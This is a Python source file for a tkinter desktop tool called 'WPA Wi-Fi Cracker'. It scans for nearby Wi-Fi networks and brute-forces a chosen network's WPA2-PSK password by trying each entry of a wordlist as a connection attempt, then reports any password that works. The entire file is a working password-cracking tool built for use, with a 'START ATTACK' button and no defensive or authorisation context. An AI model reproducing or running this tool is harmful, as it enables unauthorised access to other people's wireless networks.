import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import pywifi
from pywifi import const
import threading
import time
import os

class WpaHackApp:
    def __init__(self, root):
        self.root = root
        self.root.title("WPA Wi-Fi Cracker")
        self.root.geometry("500x600")
        
        self.wifi = pywifi.PyWiFi()
        self.interfaces = self.wifi.interfaces()
        self.selected_interface = None
        self.stop_event = threading.Event()
        self.is_running = False

        self.setup_ui()

    def setup_ui(self):
        # --- Interface Selection ---
        frame_iface = tk.LabelFrame(self.root, text="1. Select Interface")
        frame_iface.pack(fill="x", padx=10, pady=5)

        if not self.interfaces:
            tk.Label(frame_iface, text="No Wi-Fi interfaces found!", fg="red").pack(pady=5)
            return

        self.iface_names = [i.name() for i in self.interfaces]
        self.combo_iface = ttk.Combobox(frame_iface, values=self.iface_names, state="readonly")
        self.combo_iface.pack(fill="x", padx=5, pady=5)
        self.combo_iface.current(0)
        self.combo_iface.bind("<<ComboboxSelected>>", self.on_iface_change)
        self.on_iface_change(None) # Initialize selected interface

        # --- Target Selection ---
        frame_target = tk.LabelFrame(self.root, text="2. Select Target Network")
        frame_target.pack(fill="x", padx=10, pady=5)

        btn_scan = tk.Button(frame_target, text="Scan Networks", command=self.start_scan_thread)
        btn_scan.pack(side="top", fill="x", padx=5, pady=2)

        self.combo_ssid = ttk.Combobox(frame_target, state="normal") # Allow typing
        self.combo_ssid.pack(fill="x", padx=5, pady=5)
        self.combo_ssid.set("Type SSID or Scan...")

        # --- Wordlist Selection ---
        frame_wordlist = tk.LabelFrame(self.root, text="3. Select Wordlist")
        frame_wordlist.pack(fill="x", padx=10, pady=5)

        self.entry_wordlist = tk.Entry(frame_wordlist)
        self.entry_wordlist.pack(side="left", fill="x", expand=True, padx=5, pady=5)
        self.entry_wordlist.insert(0, "output.txt")

        btn_browse = tk.Button(frame_wordlist, text="Browse", command=self.browse_file)
        btn_browse.pack(side="right", padx=5, pady=5)

        # --- Controls ---
        frame_controls = tk.Frame(self.root)
        frame_controls.pack(fill="x", padx=10, pady=10)

        self.btn_start = tk.Button(frame_controls, text="START ATTACK", bg="red", fg="white", font=("Arial", 12, "bold"), command=self.start_attack)
        self.btn_start.pack(side="left", fill="x", expand=True, padx=5)

        self.btn_stop = tk.Button(frame_controls, text="STOP", bg="gray", fg="white", font=("Arial", 12, "bold"), command=self.stop_attack, state="disabled")
        self.btn_stop.pack(side="right", fill="x", expand=True, padx=5)

        # --- Log ---
        frame_log = tk.LabelFrame(self.root, text="Logs")
        frame_log.pack(fill="both", expand=True, padx=10, pady=5)

        self.txt_log = scrolledtext.ScrolledText(frame_log, height=10)
        self.txt_log.pack(fill="both", expand=True, padx=5, pady=5)

    def log(self, message):
        self.txt_log.insert(tk.END, message + "\n")
        self.txt_log.see(tk.END)

    def on_iface_change(self, event):
        idx = self.combo_iface.current()
        if idx >= 0:
            self.selected_interface = self.interfaces[idx]

    def browse_file(self):
        filename = filedialog.askopenfilename(title="Select Wordlist", filetypes=(("Text Files", "*.txt"), ("All Files", "*.*")))
        if filename:
            self.entry_wordlist.delete(0, tk.END)
            self.entry_wordlist.insert(0, filename)

    def start_scan_thread(self):
        threading.Thread(target=self.scan_networks, daemon=True).start()

    def scan_networks(self):
        if not self.selected_interface:
            return
        
        self.log("Scanning for networks...")
        try:
            self.selected_interface.scan()
            time.sleep(5)
            results = self.selected_interface.scan_results()
            ssids = sorted(list(set([r.ssid for r in results if r.ssid])))
            
            def update_combo():
                self.combo_ssid['values'] = ssids
                if ssids:
                    self.combo_ssid.current(0)
                self.log(f"Scan complete. Found {len(ssids)} networks.")
            
            self.root.after(0, update_combo)
        except Exception as e:
            self.root.after(0, lambda: self.log(f"Scan error: {e}"))

    def start_attack(self):
        ssid = self.combo_ssid.get()
        wordlist = self.entry_wordlist.get()

        if not ssid or ssid == "Type SSID or Scan...":
            messagebox.showwarning("Error", "Please select or type a target SSID.")
            return
        
        if not os.path.exists(wordlist):
            messagebox.showwarning("Error", "Wordlist file not found.")
            return

        self.is_running = True
        self.stop_event.clear()
        self.btn_start.config(state="disabled")
        self.btn_stop.config(state="normal", bg="red")
        self.combo_iface.config(state="disabled")
        
        threading.Thread(target=self.run_attack, args=(ssid, wordlist), daemon=True).start()

    def stop_attack(self):
        if self.is_running:
            self.log("Stopping attack...")
            self.stop_event.set()

    def run_attack(self, ssid, wordlist):
        self.log(f"Starting attack on: {ssid}")
        self.log(f"Using wordlist: {wordlist}")
        
        iface = self.selected_interface
        iface.disconnect()
        time.sleep(1)

        found = False
        try:
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    if self.stop_event.is_set():
                        break
                    
                    password = line.strip()
                    if not password:
                        continue

                    self.root.after(0, lambda p=password: self.log(f"Trying: {p}"))
                    
                    profile = pywifi.Profile()
                    profile.ssid = ssid
                    profile.auth = const.AUTH_ALG_OPEN
                    profile.akm.append(const.AKM_TYPE_WPA2PSK)
                    profile.cipher = const.CIPHER_TYPE_CCMP
                    profile.key = password

                    iface.remove_all_network_profiles()
                    tmp_profile = iface.add_network_profile(profile)
                    iface.connect(tmp_profile)

                    # Wait for connection
                    start_time = time.time()
                    connected = False
                    while time.time() - start_time < 5:
                        if iface.status() == const.IFACE_CONNECTED:
                            connected = True
                            break
                        if self.stop_event.is_set():
                            break
                        time.sleep(0.1)

                    if connected:
                        self.root.after(0, lambda p=password: messagebox.showinfo("SUCCESS", f"Password Found: {p}"))
                        self.root.after(0, lambda p=password: self.log(f"SUCCESS! Password: {p}"))
                        found = True
                        break
                    
                    iface.disconnect()

        except Exception as e:
            self.root.after(0, lambda: self.log(f"Error: {e}"))

        if not found and not self.stop_event.is_set():
             self.root.after(0, lambda: messagebox.showinfo("Failed", "Password not found in wordlist."))
             self.log("Attack finished. Password not found.")
        elif self.stop_event.is_set():
            self.log("Attack stopped by user.")

        self.root.after(0, self.reset_ui)

    def reset_ui(self):
        self.is_running = False
        self.btn_start.config(state="normal")
        self.btn_stop.config(state="disabled", bg="gray")
        self.combo_iface.config(state="readonly")

if __name__ == "__main__":
    root = tk.Tk()
    app = WpaHackApp(root)
    root.mainloop()